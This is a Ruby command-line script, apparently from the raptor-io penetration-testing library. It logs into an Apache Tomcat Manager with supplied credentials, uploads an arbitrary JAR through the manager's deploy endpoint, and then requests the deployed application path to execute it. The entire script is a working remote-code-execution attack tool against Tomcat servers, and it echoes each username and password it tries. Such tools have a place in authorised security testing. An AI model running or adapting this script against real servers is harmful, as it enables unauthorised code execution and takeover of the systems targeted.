#!/usr/bin/env ruby
$:.push File.join(File.dirname(__FILE__), "..", "lib")

require 'raptor-io'
require 'optparse'
require 'uri'

options = {}

my_opts = OptionParser.new do |opts|
  opts.banner = "Usage: tomcat_mgr_deploy.rb [options]"

  opts.on("--url <URL>", "Full URL of the Tomcat Mgr. Ex: http://192.168.1.1/manager") do |url|
    options[:url] = url
  end

  opts.on("--jar <JAR>", "JAR's path to upload and deploy") do |jar|
    options[:jar] = jar
  end

  opts.on("--app-base <APP_BASE>", "JAR's application base name") do |app_base|
    options[:app_base] = app_base
  end

  opts.on("--username <USERNAME>", "Username to attempt to login with") do |username|
    options[:username] = username
  end

  opts.on("--password <PASSWORD>", "Password to attempt to login with") do |password|
    options[:password] = password
  end
end

my_opts.parse!

[:url, :jar, :username, :password, :app_base].each do |option|
  unless options[option]
    puts my_opts
    exit
  end
end

# Get JAR

unless File.exist?(options[:jar])
  puts "[!] JAR not found, please provide a correct path"
  puts my_opts
  exit
end

jar_contents = ""
File.open(options[:jar], "rb") { |f| jar_contents = f.read }

# parse URI

begin
  uri = URI(options[:url])
rescue URI::InvalidURIError
  puts "[!] Invalid URL"
  exit
end

manager_path = uri.path

http_client =  RaptorIO::Protocol::HTTP::Client.new(switch_board: RaptorIO::Socket::SwitchBoard.new)

# Authentication

uri.path = File.join(uri.path, "html")
puts "[*] Sending Test request for Authentication challenge..."
test_response = http_client.get(uri.to_s, mode: :sync)

unless test_response.code == 401
  puts "[!] Did not request authorization. Make sure you have the URL right"
  exit
end

get_opts = {
  mode: :sync, manipulators: {
    'authenticators/basic' =>
    {
      username: options[:username],
      password: options[:password]
    }
  }
}

puts "[*] Sending login #{options[:username]}:#{options[:password]}..."
tomcat_login_response =  http_client.get(uri.to_s, get_opts)

if tomcat_login_response.code == 200
  puts "[*] LOGIN SUCCESSFUL! (#{options[:username]}:#{options[:password]})"
else
  puts "[!] LOGIN FAILED (#{options[:username]}:#{options[:password]})"
  exit
end

# JAR Upload

put_opts = {
  http_method: :put,
  mode: :sync,
  parameters: {
    'path' => options[:app_base]
  },
  manipulators: {
    'authenticators/basic' =>
      {
        username: options[:username],
        password: options[:password]
      }
  },
  headers: {
    'content-type' => 'application/octet-stream'
  },
  body: jar_contents
}

uri.path = File.join(manager_path, "deploy")
uri.query = "path=/#{options[:app_base]}"

puts "[*] Uploading JAR..."
upload_response = http_client.request(uri.to_s, put_opts)

unless upload_response.code == 200 && upload_response.text? && upload_response.body =~ /OK/
  puts "[!] JAR Upload failed"
  exit
end

# Execution

p "[*] Executing JAR..."
uri.path = "/#{options[:app_base]}"
uri.query = ""
http_client.get(uri.to_s, mode: :sync)
